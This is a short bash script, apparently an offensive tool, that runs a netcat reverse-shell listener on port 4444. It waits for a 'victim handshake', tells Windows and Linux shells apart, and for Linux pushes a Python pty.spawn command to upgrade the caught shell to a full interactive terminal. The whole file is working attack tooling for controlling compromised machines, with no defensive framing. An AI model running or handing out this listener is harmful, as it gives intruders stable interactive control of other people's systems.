#!/bin/bash
PORT=${1:-4444}
IP=$(hostname -I | awk '{print $1}')

echo -e "\e[1;32m[+]\e[0m Automated Multi-Platform Listener (Python) on port \e[1;33m$PORT\e[0m..."
echo -e "\e[1;34m[*]\e[0m Waiting for victim handshake..."

# 1. Catch the handshake (Double-Tap logic)
IDENT=$(nc -lvnp $PORT | head -n 1)

if [[ "$IDENT" == *"WINDOWS_SHELL"* ]]; then
    echo -e "\e[1;36m[*]\e[0m Windows detected! Switching to Standard Listener..."
    # Ensure terminal is in sane mode for Windows
    stty sane
    nc -lvnp $PORT
elif [[ "$IDENT" == *"LINUX_SHELL"* ]]; then
    echo -e "\e[1;34m[*]\e[0m Linux detected! Starting Python PTY Upgrade..."
    
    # 2. Linux Interactive TTY Upgrade using Python
    # We set raw mode locally and send the PTY spawn command to the victim
    stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")' || /bin/bash"; cat) | nc -lvnp $PORT; stty sane
else
    echo -e "\e[1;31m[!]\e[0m Unknown handshake: $IDENT. Defaulting to basic NC..."
    stty sane
    nc -lvnp $PORT
fi
